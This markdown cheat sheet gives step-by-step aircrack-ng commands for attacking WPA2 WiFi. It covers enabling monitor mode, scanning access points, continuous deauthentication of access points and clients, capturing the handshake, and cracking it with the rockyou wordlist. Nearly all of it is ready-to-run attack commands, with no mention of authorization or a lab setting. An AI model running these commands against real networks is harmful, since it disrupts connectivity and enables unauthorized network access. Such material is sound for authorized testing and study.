
### prep interface

```airmon-ng check kill```

```sudo airmon-ng start wlan0```

* now our monitor interface will be wlan0mon

----

### scanning BSSID's near-by

AiroDump ALL in channels 1-165 and ignoring negative one.

```airodump-ng -c 1-165 wlan0mon --ignore-negative-one```


Or to filter and display ONLY the BSSID (MAC Address once known), try the below.

```sudo airodump-ng wlan0mon -d xx:xx:xx:xx:xx:xx```


Filter and exclude ESSID with regex

```sudo airmon-ng -R '^(?!.*WIFINAME1)' -c 6 wlan0mon```

Filter and exclude multiple ESSIDs with regex

```sudo airmon-ng -R '^(?!.*WIFINAME1)^(?!.*WIFINAME2)' -c 6 wlan0mon```

----

### de-auth BSSID 

Basic BSSID de-auth continiously

```aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon```


de-auth a wireless client specific to ESSID continiously. More successful when using client paramter. 

```aireplay-ng --deauth 0 wlan0mon -a xx:xx:xx:xx:xx:xx -e ESSID_WIFI_NAME -c xx:xx:xx:xx:xx:xx```

the above -a is the BSSID (MAC of WIFI AP), -c is the client mac address (i.e. phone, device) connecting to the wifi.


----

### Capture to file (4 way handshake)

"<i>-c X</i>". This should be the channel of the BSSID we wish to target after "-c".
-w will output the capture to the filename in this example as "wifi-capture".

```airodump-ng -w wifi-capture -c X --bssid xx:xx:xx:xx:xx:xx wlan0mon```

----

### Cracking the handshake capture

The example below uses the capture file example of "wifi-capture" and the ".cap" file.

This then uses aircrack-ng to process the capture file using the "rockyou.txt" wordlist.

*Note there are other wordlists you could use, but the rockyou wordlist is quite popular and good.

```aircrack-ng wifi-capture.cap -w /usr/share/wordlists/rockyou.txt```

----

David Bombal has some videos showing further how this works. Links below.

[Cracking WiFi WPA2 Handshake](https://www.youtube.com/watch?v=WfYxrLaqlN8)

Paul from TallPaulTech (CWNE88) also explains the "4 way handshake" in this [video](https://www.youtube.com/watch?v=vHIRmG_BzQI)
